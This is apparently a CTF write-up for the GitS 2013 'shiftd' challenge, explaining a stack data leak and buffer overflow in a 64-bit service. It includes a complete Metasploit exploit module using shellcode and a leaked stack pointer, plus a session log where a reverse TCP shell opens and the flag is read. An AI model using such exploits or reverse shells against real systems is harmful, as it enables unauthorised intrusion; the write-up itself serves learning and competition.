---
layout: post
title: "GitS 2013 - Shiftd"
date: 2013-02-17 13:57
comments: true
categories: [pwnable]
author: stacks0n
---
## Challenge
Points: 100

Find the key! ([File](https://2013.ghostintheshellcode.com/shiftd-3a9c2a55e77d1467ee46dfb931170c737d24f310) running at shiftd.2013.ghostintheshellcode.com:5177)
## Analysis
64-bit ELF. Note that unlike most challenges this app read from STDIN. In order to make it a networked service, we can run the following:
```bash 
stacks0n@ubuntu:~/Desktop$ nc -l -p 5177 -e ./shiftd
```

Closes connection after sending any data for the most part. Open up in IDA and notice the following:
```
.text:0000000000400A42                 mov     edx, 0Ah
.text:0000000000400A47                 mov     esi, 64
.text:0000000000400A4C                 mov     rdi, rax
.text:0000000000400A4F                 call    sub_4007F4
.text:0000000000400A54                 lea     rax, [rbp-40h]
.text:0000000000400A58                 lea     rsi, aNowisthewinter ; "NowIsTheWinterOfOurDiscountTent"
.text:0000000000400A5F                 mov     rdi, rax
.text:0000000000400A62                 call    _strcmp
```

So, need to send special passphrase of "NowIsTheWinterOfOurDiscountTent".

Test run of the application:
```
$ nc shiftd.2013.ghostintheshellcode.com 5177
NowIsTheWinterOfOurDiscountTent
Welcome to Shifty's Time Formatting Service!
What is your name?
stacks0n
Welcome, stacks0n 
                  @!
Please provide a time format:
%D
Your formatted time is:
02/16/13

Thank you! Come again!
```

When our username is returned to us, we notice a bunch of other data being printed out as well.

sub_4007F4() is responsible for reading data from the socket. The prototype seems to be something like:

```
read_from_socket(buffer, size, delimeter)
```
where the arguments are passed in registers. The delimeter is always specified by 0x0A (newline). The method reads one byte at a time until size is met or the delimeter is reached.

Since buffers are not cleared out or null terminated, stack data is leaked when our username is printed back out to us. This is especially handy since the data contains a stack pointer which can later help us redirect execution. Note that the stack is executable, but randomized.

Unfortunately, I spent too much time focusing on the call to strftime() and its format specifiers. Although you can prepend padding ('%100D'), there is no '%n' to write the number of bytes written.

The code for reading in the format string is as follows:
```
.text:0000000000400931                 mov     rax, cs:off_601068
.text:0000000000400938                 mov     rcx, rax
.text:000000000040093B                 and     ecx, 7FFFFFFFh
.text:0000000000400941                 lea     rax, [rbp+format]
.text:0000000000400948                 mov     edx, 0Ah
.text:000000000040094D                 mov     rsi, rcx
.text:0000000000400950                 mov     rdi, rax
.text:0000000000400953                 call    read_from_socket
```

Note that the format string buffer is size 1024, and the call is:
```
read_from_socket(format, 0x6014b0, '\n').
```

So there we have it, a stack based buffer overflow. 1064 bytes until we reach the stored return address on the stack. By leveraging the leaked stack pointer, we can redirect execution to our embedded shellcode.

MSF Module:
```ruby
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
        Rank = GreatRanking

        include Msf::Exploit::Remote::Tcp

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'GitS 2013 Pwnable 100 - shiftd',
                        'Author'         => [ 'stacks0n', 'hubris' ],
                        'Privileged'     => false,
                        'Platform'       => [ 'linux' ],
                        'Arch'           => ARCH_X86_64,
                        'Targets'        => [ [ 'Automatic', { }  ], ],
                        'DefaultTarget'  => 0))

                register_options(
                        [
                                Opt::RHOST('54.235.156.9'),
                                Opt::RPORT(5177)
                        ], self.class)

        end

        def exploit
                connect

                # send the secret password
                # we can send extra data, not that it matters
                sock.put("NowIsTheWinterOfOurDiscountTent\x00" + "A" * 32 + "\n")
                print_status sock.get_once

                # send the username
                sock.put("|\n")
                resp = print_status sock.get_once

                # process the stack address that is leaked to us
                stack_addr = "\x00" + resp.split("|").last.split("!").first + "\x00\x00"

                # subtract some off this stack addres to allow us more room for
                # nop sled and shellcode
                stack_addr = [stack_addr.unpack("Q").first - 0x100].pack("Q")

                # send the format string for strftime()
                # overflow alert!
                payload_size = 1064
                junk = "A" * 48 # we don't want to trash our payload with push's
                p = "\x90" * (payload_size - (payload.encoded.size + junk.size))
                p += payload.encoded + junk

                # send the payload
                sock.put(p + stack_addr + "\n")
                print_status sock.get_once

                handler
                disconnect
        end
```

```bash
msf  exploit(shiftd) > show options

Module options (exploit/gits/shiftd):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  204.236.213.69   yes       The target address
   RPORT  5177             yes       The target port


Payload options (linux/x64/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  50.142.246.171   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf  exploit(shiftd) > exploit

[-] Handler failed to bind to 50.142.246.171:4444
[*] Started reverse handler on 0.0.0.0:4444 
[*] Welcome to Shifty's Time Formatting Service!
What is your name?

[*] Welcome, |??(!
Please provide a time format:

[*] Your formatted time is:
??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????j)X?j_j^H?H?

Thank you! Come again!

[*] Command shell session 1 opened (192.168.1.101:4444 -> 204.236.213.69:36107) at 2013-02-16 16:49:49 -0500

cat key
cat: key: No such file or directory
whoami
shiftd
cd /home/shiftd
ls
key
shiftd
cat key
http://shifty.urbanup.com/4195551
```
## Solution
http://shifty.urbanup.com/4195551
